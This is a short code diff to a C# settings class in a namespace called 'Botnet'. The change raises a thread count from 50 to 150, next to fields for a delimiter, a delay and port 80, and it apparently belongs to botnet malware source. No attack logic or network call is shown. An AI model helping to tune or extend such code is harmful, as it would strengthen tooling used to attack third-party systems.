@@ -13,7 +13,7 @@ namespace Botnet
         public static string spliter = "{split}";
         public static int delay = 3000;
         public static int port = 80;
-        public static int threads = 50;
+        public static int threads = 150;
 
     }
 }
